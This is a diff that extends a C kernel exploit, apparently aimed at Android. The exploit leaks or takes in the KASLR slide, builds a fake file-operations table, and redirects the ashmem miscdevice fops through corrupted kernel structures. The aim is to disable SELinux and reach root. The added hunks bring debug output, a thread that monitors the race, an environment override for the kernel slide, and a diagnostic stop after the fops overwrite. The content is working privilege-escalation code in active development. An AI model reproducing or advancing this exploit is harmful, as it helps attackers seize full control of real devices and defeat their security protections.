@@ -216,11 +216,13 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         if (atomic_load(&punch_consume_stop) ||
             atomic_load(&punch_consume_go) != seq) break;
         atomic_fetch_add(&consumer_calls, 1);
+        pr_info("consumer: walk begin tid=%d\n", tid); fsync(1);
         errno = 0;
         long sched_ret = env_flag("NO_WALK", 0)
                              ? 0
                              : sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
         int sched_errno = errno;
+        pr_info("consumer: walk end ret=%ld errno=%d\n", sched_ret, sched_errno); fsync(1);
         if (sched_ret != 0) {
           errno = 0;
           struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
@@ -236,6 +238,25 @@ void *consumer_thread(void *arg __attribute__((unused))) {
           }
         }
         if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
+        if (env_flag("SSOPT_PEEK", 0)) {
+          /* Observe the fake page right after the walk, from THIS thread: if the
+           * walk hard-locked (spinlock held, IRQs off) the machine is reset by
+           * the watchdog and any later print (route-side peek after its spin)
+           * is lost.  page[0x108] (fake_fops->llseek) becomes dbg_rb_right only
+           * if chain[7] rb_erase_cached() really ran with our painted node. */
+          pr_info("cons peek ret=%ld cl=%d succ=%d "
+                  "page[0x00]=%016zx [0x08]=%016zx [0x10]=%016zx "
+                  "[0x108]=%016zx [0x110]=%016zx [0x310]=%016zx\n",
+                  sched_ret, atomic_load(&consumer_calls),
+                  atomic_load(&consumer_success),
+                  (uintptr_t)ssopt_page_readback(0x00),
+                  (uintptr_t)ssopt_page_readback(0x08),
+                  (uintptr_t)ssopt_page_readback(0x10),
+                  (uintptr_t)ssopt_page_readback(0x108),
+                  (uintptr_t)ssopt_page_readback(0x110),
+                  (uintptr_t)ssopt_page_readback(0x310));
+          fsync(1);
+        }
         atomic_store(&pselect_walk_done, 1);
         calls_this_seq++;
         if (calls_this_seq >= CONSUMER_MAX_CALLS) {
@@ -261,12 +282,34 @@ void reset_main_route_state(void) {
   cfi_last_step = 0; cfi_last_errno = 0;
 }
 
+static void *route_monitor_thread(void *arg __attribute__((unused))) {
+  pin_to_core(2);
+  for (;;) {
+    pr_info("MON t=%.0f waiter_rdy=%d wait_wait=%d own_s=%d own_d=%d route=%d "
+            "go=%d cc=%d succ=%d psel=%d walk=%d\n",
+            timer_ms(),
+            atomic_load(&waiter_ready), atomic_load(&waiter_waiting),
+            atomic_load(&owner_started), atomic_load(&owner_chain_done),
+            atomic_load(&route_done), atomic_load(&punch_consume_go),
+            atomic_load(&consumer_calls), atomic_load(&consumer_success),
+            atomic_load(&pselect_select_done), atomic_load(&pselect_walk_done));
+    fsync(1);
+    usleep(250000);
+  }
+  return NULL;
+}
+
 void run_main_route_threads(void) {
   reset_main_route_state();
   pthread_t waiter, owner, consumer;
   SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
   SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
+  if (env_flag("ROUTE_MON", 0)) {
+    pthread_t mon;
+    pthread_create(&mon, NULL, route_monitor_thread, NULL);
+    pthread_detach(mon);
+  }
   while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
     usleep(1000);
   usleep(50000);
@@ -653,10 +696,31 @@ int run_exploit(int argc, char **argv) {
   }
   kaslr_done = 1;
 
+  /* SLIDE env: inject the runtime KASLR slide directly.
+   * slide = runtime base - KIMAGE_TEXT_BASE = (kernel "Kernel Offset") +
+   * TEXT_OFFSET(0x80000), evidence in BAN_GIAO 21.2 / Image header
+   * text_offset=0x80000.  Must be set BEFORE prepare_skb_payload() so every
+   * text_addr() of the fake fops table is correct; leak_kernel_base() cannot
+   * be used first (it needs a working fake fops -> circular). */
+  int slide_env_set = 0;
+  {
+    const char *slide_env = getenv("SLIDE");
+    if (slide_env && *slide_env) {
+      uint64_t s = strtoull(slide_env, NULL, 0);
+      kaslr_base = KIMAGE_TEXT_BASE + s;
+      kaslr_slide = s;
+      kaslr_done = 1;
+      slide_env_set = 1;
+      pr_success("slide SLIDE env base=%016llx slide=%016llx\n",
+                 (unsigned long long)kaslr_base, (unsigned long long)s);
+      fsync(1);
+    }
+  }
+
   /* SLIDE KASLR leak.  Its PI write targets are all physical aliases
    * (loggers / sysctl_bootid / init_task), so it works before we can reach
    * text_addr().  Needed because RANDOMIZE_BASE=y. */
-  if (!env_flag("NO_SLIDE", 0)) {
+  if (!env_flag("NO_SLIDE", 0) && !slide_env_set) {
     if (slide_leak_kernel_base()) {
       pr_success("slide KASLR base=%016llx slide=%016llx\n",
                  (unsigned long long)kaslr_base,
@@ -684,16 +748,38 @@ int run_exploit(int argc, char **argv) {
       active_offsets->off_system_unbound_wq &&
       active_offsets->off_ashmem_misc_fops;
 
-  if (!selinux_ok && umh_available) {
+  if ((!selinux_ok || env_flag("FORCE_REDIRECT", 0)) && umh_available) {
     /* UMH path: mode=4 redirects miscdevice fops via W0's pi_tree.
      * miscdevice starts at ASHMEM_FOPS_PTR (repr(transparent) Registration).
      * fops at miscdevice+0x10 = ASHMEM_MISC_FOPS. */
     pr_info("UMH path: fops redirect (mode=4)...\n");
     slab_drain();
     TIMER("pre-UMH drain");
-    do_one_write(data_addr(ASHMEM_MISC_FOPS), "fops redirect", 4);
+    /* mode-4 write target = &ashmem_misc.fops.  With KASLR the linear alias
+     * (data_addr) needs the exact loader physical base (unknown/possibly
+     * randomized -> tried delta 0 and 0x80000, both miss).  Once the virtual
+     * slide is known the canonical image address is exact and maps the same
+     * physical page (.data is RW). */
+    uintptr_t fops_redirect_target =
+        (kaslr_slide != 0) ? canon_addr(ASHMEM_MISC_FOPS)
+                           : data_addr(ASHMEM_MISC_FOPS);
+    pr_info("fops redirect target=%016zx (%s)\n",
+            (size_t)fops_redirect_target,
+            (kaslr_slide != 0) ? "canon" : "linear");
+    fsync(1);
+    do_one_write(fops_redirect_target, "fops redirect", 4);
     TIMER("fops redirect done");
     selinux_ok = check_selinux_off();
+  }
+
+  if (env_flag("ONLY_FOPS", 0)) {
+    /* Diagnostic stop: the W1/W2 phases still crash for unrelated reasons
+     * (see BAN_GIAO §19.3); with ONLY_FOPS=1 a run is clean and verifies the
+     * mode-4 fops redirect without tripping them. */
+    pr_success("ONLY_FOPS: stop after fops redirect (selinux_off=%d)\n",
+               selinux_ok);
+    fsync(1);
+    return 0;
   }
 
   if (!selinux_ok && !root_child_done) {
@@ -879,6 +965,27 @@ static int run_write1_only(void) {
   }
   kaslr_done = 1;
 
+  /* SLIDE env: inject the runtime KASLR slide directly.
+   * slide = runtime base - KIMAGE_TEXT_BASE = (kernel "Kernel Offset") +
+   * TEXT_OFFSET(0x80000), evidence in BAN_GIAO 21.2 / Image header
+   * text_offset=0x80000.  Must be set BEFORE prepare_skb_payload() so every
+   * text_addr() of the fake fops table is correct; leak_kernel_base() cannot
+   * be used first (it needs a working fake fops -> circular). */
+  int slide_env_set = 0;
+  {
+    const char *slide_env = getenv("SLIDE");
+    if (slide_env && *slide_env) {
+      uint64_t s = strtoull(slide_env, NULL, 0);
+      kaslr_base = KIMAGE_TEXT_BASE + s;
+      kaslr_slide = s;
+      kaslr_done = 1;
+      slide_env_set = 1;
+      pr_success("slide SLIDE env base=%016llx slide=%016llx\n",
+                 (unsigned long long)kaslr_base, (unsigned long long)s);
+      fsync(1);
+    }
+  }
+
   if (check_selinux_off()) {
     pr_success("SELinux already off\n");
     return 0;
@@ -935,6 +1042,11 @@ static int run_route_only(int argc, char **argv) {
 }
 
 int main(int argc, char **argv) {
+  /* The panic workflow depends on the log surviving an Oops: with stdout
+   * redirected to a file it is block-buffered and everything printed between
+   * flushes is lost (gl.log ended up 0 bytes after every crash). */
+  setvbuf(stdout, NULL, _IONBF, 0);
+  setvbuf(stderr, NULL, _IONBF, 0);
     setvbuf(stdout, NULL, _IONBF, 0);
     handle_umh_mode(argc, argv);
     if (argc > 1 && strcmp(argv[1], "--bootstrap") == 0)
